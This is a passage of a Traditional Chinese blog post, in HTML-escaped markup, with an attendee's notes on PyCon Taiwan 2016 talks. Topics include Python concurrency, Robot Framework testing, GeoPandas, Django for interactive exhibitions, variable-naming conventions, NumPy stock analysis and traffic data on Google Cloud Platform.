&lt;li&gt;既然一次只能執行一個 thread, 為什麼還是比 Synchronous 快呢？  &lt;ul&gt;
&lt;li&gt;因為剛剛的例子是 IO bound, 在等待的時間就可以 switch 到其他 thread 做事情。  &lt;/li&gt;
&lt;li&gt;如果是 CPU bound 的話，multithread 就沒啥太大的優勢，得用 multiprocessing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-processing  &lt;ul&gt;
&lt;li&gt;建一個 Pool, 然後用 subprocess 去處理事情。  &lt;/li&gt;
&lt;li&gt;對於過於龐大的程式的話，可能會造成 memory over-head.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers  &lt;ul&gt;
&lt;li&gt;把 thread 抽出來，放到另外一個 machine 執行  &lt;/li&gt;
&lt;li&gt;RQ (Redis Queue)  &lt;ul&gt;
&lt;li&gt;A simple Python library backed by Redis for queueing.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scalibility 會比較好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers with Cloud Platform Service  &lt;ul&gt;
&lt;li&gt;Iaas  &lt;ul&gt;
&lt;li&gt;自訂性比較高，但管理上會比較麻煩一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paas  &lt;ul&gt;
&lt;li&gt;Instances 的增減 (auto-scaling) 都交由 cloud platform provider 管理，不用自己管。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 一堆人電講者是怎樣 LOL  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Robot Framework: An ATDD Framework by Apua&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ATDD (Acceptance-test-driven development)  &lt;/li&gt;
&lt;li&gt;Robot Framework 可以做到分散式測試，不只是個 automation tool  &lt;/li&gt;
&lt;li&gt;Acceptance Test  &lt;ul&gt;
&lt;li&gt;Minimal Accpetance Test  &lt;ul&gt;
&lt;li&gt;只取最小的集合，驗證這個產品是他想要的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;End-to-End Acceptance Test  &lt;ul&gt;
&lt;li&gt;把所有能夠想到的測試都跑過一遍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把一個很大的 User story 拆解成各種小的 test  &lt;/li&gt;
&lt;li&gt;Behavior driven testing  &lt;ul&gt;
&lt;li&gt;keywords: Given, When, Then  &lt;/li&gt;
&lt;li&gt;keywords 其實就是 function  &lt;/li&gt;
&lt;li&gt;robot framework 可以讓你用 @keyword 來將關鍵字綁定到特定的 function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyBot  &lt;ul&gt;
&lt;li&gt;可以把 keyword 的 traceback show 給你看  &lt;/li&gt;
&lt;li&gt;可以把所有 test cases 都直接 show 出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flow  &lt;/li&gt;
&lt;li&gt;Robot framework 的特性  &lt;ul&gt;
&lt;li&gt;Format  &lt;ul&gt;
&lt;li&gt;支援各種常用格式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Programmability  &lt;ul&gt;
&lt;li&gt;Limited flow control  &lt;ul&gt;
&lt;li&gt;只有 for loop，沒有 while  &lt;/li&gt;
&lt;li&gt;只能用 ternary operator, 沒有 if else  &lt;/li&gt;
&lt;li&gt;透過嚴格的限制，讓你很難把 test cases 寫的很亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援把檔案當成是變數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hierechical structure  &lt;ul&gt;
&lt;li&gt;Variable files in YAML, Python  &lt;/li&gt;
&lt;li&gt;Resource files to collect keywords and libraries  &lt;/li&gt;
&lt;li&gt;File and directory to organize setup/teardown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tagging  &lt;ul&gt;
&lt;li&gt;Category to select  &lt;/li&gt;
&lt;li&gt;Set critical cases  &lt;ul&gt;
&lt;li&gt;可以很容易做到 small test  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以自己訂 tag 來做到不同的不同的版本使用不同的測試環境和測資，跟上面的 variable files 做結合。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Documentation  &lt;ul&gt;
&lt;li&gt;支援把 test case 以 docstring 的方式撰寫，讓可維護性提高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Remote Library  &lt;ul&gt;
&lt;li&gt;遇到把跑測試的環境和測資是分開時，這很好用。  &lt;/li&gt;
&lt;li&gt;使用 XML-RPC protocol  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;可以客製化 report  &lt;/li&gt;
&lt;li&gt;IDE support  &lt;/li&gt;
&lt;li&gt;支援自建 keywords  &lt;/li&gt;
&lt;li&gt;有支援使用 API 操作  &lt;/li&gt;
&lt;li&gt;CI Plugin  &lt;ul&gt;
&lt;li&gt;Jenkins  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Third party plugins on pip 也很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Summary  &lt;ul&gt;
&lt;li&gt;Robot Framework 提供了很方便的方式讓你可以很快針對需求去撰寫測試。  &lt;/li&gt;
&lt;li&gt;ATDD breakdown story  &lt;ul&gt;
&lt;li&gt;Acceptance test  &lt;/li&gt;
&lt;li&gt;Implement/reuse keyword  &lt;/li&gt;
&lt;li&gt;Automation for testing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015/12/31 開始支援 Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Parallel PyBot  &lt;ul&gt;
&lt;li&gt;這不確定有沒有疑慮，因為 test cases 最好是循序跑比較好，因為有些可能會有相依性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 好熱烈，看來很多人對 testings 都有蠻多疑問和蠻有興趣的。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Python 導入系統軟體教學 by Jserv&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;20 多年前臺灣走在軟體產業的前端，從辦公軟體到作業系統，沒有什麼是臺灣沒辦法寫的，開源軟體貢獻度大勝亞洲各國；20 多年後，在頂大的創新競賽上，評審教授會跟你說「為什麼不用 ApplePay 就好。」  &lt;/li&gt;
&lt;li&gt;20 年前台灣許多軟體都有人開發，除了作業系統和編譯器沒有以外。  &lt;/li&gt;
&lt;li&gt;15 年前台灣對 Linux 和 BSD 的貢獻是領先亞洲其他國家的。  &lt;/li&gt;
&lt;li&gt;蕭柏納說：「生命不該是支燃燒的蠟燭，燒完就沒。而是一把火炬，應該要努力發光發熱，然後交到下一代的手上。」  &lt;/li&gt;
&lt;li&gt;Nand2Tetris  &lt;/li&gt;
&lt;li&gt;ARRC 前瞻火箭計劃  &lt;/li&gt;
&lt;li&gt;帶學生參與真正的開源計劃，由於貿然投入大型開源計劃的難度是很高的，所以從自己打造比小型但是完整開源系統帶學生做起。然後積極投稿世界一流的 Open Source Conference，讓學生可以被國際看見外，也能夠獲得成就感，並繼續投入到開源的世界中。  &lt;/li&gt;
&lt;li&gt;學生是有熱情的，參與 Open Source 的人也比以前多，但大多數人都是自己玩自己的，學生不知道如何跟人家打群架。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: From Pandas to GeoPandas by 尼斯&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GeoPandas == Pandas + GIS  &lt;/li&gt;
&lt;li&gt;台灣常用的座標參考系統  &lt;ul&gt;
&lt;li&gt;WGS84 (Lat/Lon)  &lt;/li&gt;
&lt;li&gt;TWD67 (TM2)  &lt;/li&gt;
&lt;li&gt;TWD97 (TM2)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shapdefile 的結構  &lt;ul&gt;
&lt;li&gt;.dbf  &lt;/li&gt;
&lt;li&gt;.shp  &lt;ul&gt;
&lt;li&gt;空間的形狀、位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.shx  &lt;ul&gt;
&lt;li&gt;索引  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.prj  &lt;ul&gt;
&lt;li&gt;投影資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Import the GeoPandas  &lt;ul&gt;
&lt;li&gt;結合數值資料並做視覺化  &lt;/li&gt;
&lt;li&gt;為了要 join 兩種資料，必須要做些預處理。（例如：欄位具有資訊，但格式不符合）  &lt;/li&gt;
&lt;li&gt;用 groupby 把某一欄位有相同值的資料排好再使用 aggergation function 將這些資料合併在一起  &lt;/li&gt;
&lt;li&gt;製作區域密度圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;情境：忠孝橋引道拆除，要賠償施工範圍半徑 500 公尺內影響到的里的所有里民  &lt;ul&gt;
&lt;li&gt;疊圖分析 (intersection)  &lt;ul&gt;
&lt;li&gt;簡單來說就是把要的資料拿出來，然後取交集，找出目標區域。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充（都可在 Jupyter Notebook 進行）  &lt;ul&gt;
&lt;li&gt;Spatial join  &lt;ul&gt;
&lt;li&gt;根據空間的關係去做 join  &lt;/li&gt;
&lt;li&gt;分析住商資料台北市各個里的平均地價  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Folium  &lt;ul&gt;
&lt;li&gt;轉成 GeoJson 後，透過 Folium 顯示出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Open Data 還不夠完善，有時候可以從 Open Street Map 拿到資料。  &lt;/li&gt;
&lt;li&gt;目前只能做 2D 的分析，沒辦法做到 3D 的分析。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 大型互動展覽的 Python 應用 by 陳炯廷&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;RPi3 上跑 Django 只 run 一支 scanner.py ?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Rough Prototype =&amp;gt; Auto Update =&amp;gt; More Development  &lt;ul&gt;
&lt;li&gt;開機時執行 Auto Update  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼要用 Django?  &lt;ul&gt;
&lt;li&gt;有 Admin 介面，不熟悉 Linux 的人也可以進入設定 server 佈署  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加上一個簡易的 HeartBeat 就可以有個簡易的後台  &lt;/li&gt;
&lt;li&gt;原本預計用 Zeroconf + Avahi 自己找主機，但因為不同的 team 屬於不同的 subnet 而作罷。  &lt;/li&gt;
&lt;li&gt;掃 QR Code 來設定機器  &lt;/li&gt;
&lt;li&gt;全區開機卡  &lt;ul&gt;
&lt;li&gt;pip install wakeonlan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;全區關機卡  &lt;ul&gt;
&lt;li&gt;收到特定的 UDP 封包就會關機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Redis PubSub  &lt;ul&gt;
&lt;li&gt;redis-py  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 socket.io-emmitter 這個 Python 套件可以用 Python 跟 socket.io 做溝通  &lt;ul&gt;
&lt;li&gt;但這個套件好像沒在 maintain 了，可能要多花時間嘗試一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Django  &lt;ul&gt;
&lt;li&gt;用 django-rest-framework 做簡易的 API 設定  &lt;/li&gt;
&lt;li&gt;用 django-allauth 做手機登入  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件用 Sphinx 產生，但總共有四間不同的公司需要 access  &lt;ul&gt;
&lt;li&gt;後來直接把頁面放在 Django 底下，但透過加上 &lt;code&gt;X-Acce-Redirect&lt;/code&gt; Header 讓 file 給 Nginx host，減輕 server 的負擔。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要以為把資料丟到 Cloud Platform，就不會有斷線的問題。因為這個才改成比較複雜的架構，但可以在聯外網路斷掉的時候正常運作。  &lt;/li&gt;
&lt;li&gt;展場的供電通常在閉館會斷電，除非有特別要求要 24 小時供電。  &lt;/li&gt;
&lt;li&gt;展場的電腦常放在很難碰到的地方。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://puredata.info/"&gt;Pure Data&lt;/a&gt; 很難串接 HTTP API，連 parse JSON 都很困難，只好弄一個簡單的 HTTP protocol 來溝通。  &lt;/li&gt;
&lt;li&gt;展場的實體東西只有一座，開展了就是 production，沒辦法分 dev / staging。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: Boost Maintainbility by Mosky&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.joelonsoftware.com/articles/Wrong.html"&gt;Making wrong code look wrong - Joel on software&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Maintainbility  &lt;ul&gt;
&lt;li&gt;Definition: To understand a random line, the lines you need to read back.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現在拿錢砸下去就有一堆機器可用，但拿錢砸學校無法生出一堆 programmer，好的維護性才能夠節省時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Making it zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"Be exact &amp;amp; consistent."  &lt;ul&gt;
&lt;li&gt;精確的命名變數，不要用些模稜良可的名字。  &lt;/li&gt;
&lt;li&gt;要保持一致性，和英文的慣用法有關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;範例&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;result = ...&lt;/code&gt; =&amp;gt; (X) #不知道是什麼的 result&lt;br /&gt;
&lt;code&gt;parsed_dict = ...&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;p&gt;用動詞開頭代表 function&lt;br /&gt;
用形容詞、介系詞或句子來代表 boolean 值  &lt;/p&gt;
&lt;h4&gt;Ops Hinit&lt;/h4&gt;
&lt;h5&gt;for non-callable&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: numeric  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;abstract type&amp;gt;&lt;/code&gt;:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_seq&lt;/code&gt;: for sequence  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_gen&lt;/code&gt;: for generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;for Callable&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `&amp;lt;verb&amp;gt;_`  
+ `&amp;lt;yes-no question&amp;gt;`  
+ `to_&amp;lt;thing&amp;gt;`
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;explicit unknown&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ `_x`: anything  
    + rather tahn an ambiguous name.  
    + You won&amp;#39;t forget to determine the ops it supports.  
    + Use hasattr or isinstnace later.
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;So, avoid None&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = query_user(uid)  
user.is_valid()  

# Then `query_user` returns `None` =&amp;gt; BOOM! An `AttributeError`!  
# Accept Excetion?  
#   Y: just raises it  
#   N: use a dummy object like &amp;#39;&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;不夠精確的例子&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;arg = parse(arg)&lt;/code&gt; =&amp;gt; (X)&lt;br /&gt;
&lt;code&gt;arg_d = parse(arg_json)&lt;/code&gt; =&amp;gt; (O)  &lt;/p&gt;
&lt;h5&gt;str/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_key&lt;/code&gt;: key (of a dict)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_url&lt;/code&gt;: URL  &lt;ul&gt;
&lt;li&gt;percent-encode  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_json&lt;/code&gt;: JSON  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;json = json.loads(json)&lt;/code&gt; =&amp;gt; (X)  &lt;/li&gt;
&lt;li&gt;JSON is a string  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_html&lt;/code&gt;: HTML  &lt;ul&gt;
&lt;li&gt;avoid XSS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_sql&lt;/code&gt;: SQL  &lt;ul&gt;
&lt;li&gt;avoid SQL injection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;numeric/x&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_no&lt;/code&gt;: number, #  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_idx&lt;/code&gt;: index  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= 0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;or just &lt;code&gt;i&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt;, &lt;code&gt;k&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_secs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;It's seconds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pct&lt;/code&gt;: percent  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;n = 10%&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;n_pct = 10&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Structure Hint&lt;/h4&gt;
&lt;h5&gt;users&lt;/h5&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;users = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(X)&lt;br /&gt;
=&amp;gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;uid_email_map = {  
    &amp;#39;a&amp;#39;: &amp;#39;a@a.com&amp;#39;,  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(O)  &lt;/p&gt;
&lt;h5&gt;for dict &amp;amp; tuple&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;key&amp;gt;_&amp;lt;value&amp;gt;_map&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;tuple  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;_pair&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;_pairs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;2-level-tuple  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;1st&amp;gt;_&amp;lt;2nd&amp;gt;_&amp;lt;3rd&amp;gt;_triple&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Don't use me&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_&amp;lt;name&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Don't use when out of  &lt;ul&gt;
&lt;li&gt;a module  &lt;/li&gt;
&lt;li&gt;a class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Performance Hint&lt;/h4&gt;
&lt;h5&gt;Should I cache it?&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;get_&lt;/code&gt;: memory op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;parse_&lt;/code&gt; / &lt;code&gt;calc_&lt;/code&gt;: CPU-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_&lt;/code&gt;: IO-bound op  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;query_or_get_&lt;/code&gt;: IO-bound op with cache  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Progressive From Zero&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以用縮寫，但不要自己發明縮寫。  &lt;/li&gt;
&lt;li&gt;Define in comment  &lt;ul&gt;
&lt;li&gt;用註解說明這個簡寫的全名是什麼  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# TODO: ...&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;拜託不要用 &lt;code&gt;# TODO&lt;/code&gt; 啊...&lt;br /&gt;
最近被這荼毒的好慘，&lt;br /&gt;
有 version control 跟 issue tracker 就不應該這樣用啊，&lt;br /&gt;
留了一堆過沒多久搞不好自己都忘記。&lt;br /&gt;
這我記得在 《Clean Code》 裡頭就有說過啦，&lt;br /&gt;
除非真的完全沒用 version control 跟 issue tracker 可以紀錄，&lt;br /&gt;
否則這些東西應該要寫在 commit log 裏面，&lt;br /&gt;
然後開個 issue 來詳細描述 TODO 啊。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paragraph &amp;amp; Section  &lt;ul&gt;
&lt;li&gt;適當的使用空白行，不要全部都擠在一起。  &lt;/li&gt;
&lt;li&gt;Title Comment: 當一個 function 做的事太多導致太長難以閱讀的話  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Line Functions Up  &lt;ul&gt;
&lt;li&gt;讓 trace back 函數時候的方向是一致的  &lt;/li&gt;
&lt;li&gt;有助於模組化  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Face Bad Smell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Comment  &lt;ul&gt;
&lt;li&gt;pitfalls: the actual return type, side effects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Seal it with better name or stabler wrapper  &lt;/li&gt;
&lt;li&gt;Stay focused  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;老實說這樣的命名法讓我彷彿看見匈牙利命名法的影子，&lt;br /&gt;
但的確這樣命名起來會省了很多麻煩，&lt;br /&gt;
總之就是一致性，&lt;br /&gt;
公司的話就需要 Coding Style 相關的規範去要求大家共同遵守了。&lt;br /&gt;
(然後我好像聽見靜態語言的嘲笑聲）  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/06/04 Sat)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Inside the Hat: Python @ Walt Disney Animation Studios by Paul Hildebrandt&lt;/h2&gt;
&lt;p&gt;提到了許多迪士尼內製作動畫的時候相關的經驗，覺得好酷啊。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;R0: 用 Numpy 做一個自己的股票分析系統 by PF&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;台灣證券交易所  &lt;/li&gt;
&lt;li&gt;台灣期貨交易所  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重要資訊  &lt;ul&gt;
&lt;li&gt;時間  &lt;/li&gt;
&lt;li&gt;開盤價(Open)  &lt;/li&gt;
&lt;li&gt;收盤價(Close)  &lt;/li&gt;
&lt;li&gt;最高價(High)  &lt;/li&gt;
&lt;li&gt;最低價(Low)  &lt;/li&gt;
&lt;li&gt;成交量(Volume)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;移動平均線(MA)  &lt;ul&gt;
&lt;li&gt;(P1 + P2 + ... + Pn) / n  &lt;/li&gt;
&lt;li&gt;n 日均線，季線  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;動作  &lt;ul&gt;
&lt;li&gt;賣出、不動、買進  &lt;/li&gt;
&lt;li&gt;判斷買賣點  &lt;/li&gt;
&lt;li&gt;計算收益  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%9A%8F%E6%9C%BA%E6%8C%87%E6%A0%87"&gt;隨機指標(KD)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;判斷多空、計算利潤、代入參數  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;itertools&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;itertools.combination_with_replacement&lt;/code&gt; 拿來比較不同的均線  &lt;/li&gt;
&lt;li&gt;但這樣做量會非常大  &lt;/li&gt;
&lt;li&gt;所以利用 numpy 的高效能特性來解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numpy  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;Sqlite + Flask + jQuery + amchart.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: 用 Google Cloud Platform 玩交通資料分析 by 柯維然(Odie)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;人每天都會有交通需求，會產生很多交通相關的資料  &lt;ul&gt;
&lt;li&gt;流量、車速、密度、旅行時間、旅次、號誌、停車位、交通事故  &lt;/li&gt;
&lt;li&gt;交通資料庫  &lt;ul&gt;
&lt;li&gt;高速公路局提供國道 VD(Viehcle Detector)、ETC 資料  &lt;/li&gt;
&lt;li&gt;縣市 Open Data 有些也有提供 VD 資料  &lt;/li&gt;
&lt;li&gt;約有 314 個門架、約有 3000 個 VD  &lt;/li&gt;
&lt;li&gt;國道五號每五百公尺就有一個 VD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為何用 Google Cloud Platform  &lt;ul&gt;
&lt;li&gt;因為我只會用這個 XD  &lt;/li&gt;
&lt;li&gt;架構  &lt;ul&gt;
&lt;li&gt;App Engine (網站、爬蟲、API）  &lt;ul&gt;
&lt;li&gt;因為其他學統計的是寫 R，所以要提供 API 給他們  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;cron.yaml&lt;/code&gt; 設定定時啟動  &lt;ul&gt;
&lt;li&gt;無法在 10 秒內完成的 job，就加到 TaskQueue 裏面，讓他失敗的時候會自動重跑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Storage  &lt;ul&gt;
&lt;li&gt;存 blob files  &lt;/li&gt;
&lt;li&gt;可以 serve 靜態網站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datastore  &lt;ul&gt;
&lt;li&gt;儲存部份資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;儲存和分析、可接其他 tools  &lt;/li&gt;
&lt;li&gt;可用搭配 Pandas  &lt;/li&gt;
&lt;li&gt;Streaming Data into BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;資料視覺化  &lt;/li&gt;
&lt;li&gt;可以直接用 scikit-learn, Pandas  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
